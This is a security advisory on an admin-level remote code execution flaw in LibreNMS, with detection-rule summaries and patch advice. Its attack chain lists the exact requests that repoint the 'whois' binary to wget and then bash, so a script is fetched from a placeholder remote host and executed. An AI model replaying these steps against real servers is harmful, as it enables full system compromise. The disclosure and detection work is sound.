---
title: LibreNMS Remote Code Execution via Arbitrary File Write
slug: 2024-01-25-librenms-rce
description: An authenticated administrator can achieve remote code execution on LibreNMS by modifying the binary path settings for built-in network tools and bypassing an input filter to execute arbitrary commands.
date: "2024-01-25T16:00:00Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - rce
  - librenms
  - web-application
vendors:
  - LibreNMS
products:
  - LibreNMS
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
references:
  - https://github.com/advisories/GHSA-pr3g-phhr-h8fh
iocs:
  - type: url
    value: http://{remote http server's ip address}/malicious.sh
ioc_counts:
  url: 1
rules:
  - title: Detect Suspicious Netcmd Usage
    description: Detects potential RCE attempts by monitoring usage of the /ajax/netcmd endpoint with suspicious commands.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - webserver
      - linux
  - title: Detect Wget Usage from Unusual Locations
    description: Detects wget being used after the whois binary path has been modified.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
rules_count: 2
---

LibreNMS is vulnerable to remote code execution (RCE) due to insufficient validation of binary paths for network diagnostic tools. This flaw, affecting versions prior to 26.3.0, allows an authenticated administrator to modify the 'whois' binary path setting. By first setting the path to `wget` and then to `bash`, an attacker can download and execute a malicious script hosted on a remote server. The vulnerability resides in the `/ajax/netcmd` endpoint, which is inadequately filtered, allowing bypass and subsequent execution of arbitrary commands. This poses a significant risk, potentially leading to complete system compromise and unauthorized access.

## Attack Chain

1. Attacker logs into LibreNMS with administrator credentials.
2. Attacker navigates to the Global Settings -> External -> Binary Locations page in the LibreNMS web interface.
3. Attacker changes the 'whois' binary path to `/usr/bin/wget`.
4. Attacker sends a request to `GET /ajax/netcmd?cmd=whois&query={remote http server's ip address}/malicious.sh` to download the malicious script using `wget`.
5. Attacker changes the 'whois' binary path to `/bin/bash`.
6. Attacker sends a request to `GET /ajax/netcmd?cmd=whois&query=malicious.sh` to execute the downloaded script using `bash`.
7. The malicious script executes on the LibreNMS server.

## Impact

Successful exploitation of this vulnerability grants the attacker Remote Code Execution (RCE). This can lead to a full system compromise, allowing the attacker to exfiltrate sensitive data, install malware, or pivot to other systems within the network. The original advisory does not specify victim counts or targeted sectors, but the potential impact is severe given the privileged access achieved.

## Recommendation

*   Monitor web server logs for requests to `/ajax/netcmd` with suspicious query parameters containing shell commands or script extensions (e.g., `.sh`, `.ps1`). See rule: "Detect Suspicious Netcmd Usage".
*   Implement stricter validation and sanitization of user-supplied input for binary paths in LibreNMS settings.
*   Restrict access to the LibreNMS administrative interface to trusted users and networks.
*   Upgrade LibreNMS to version 26.3.0 or later to patch this vulnerability.
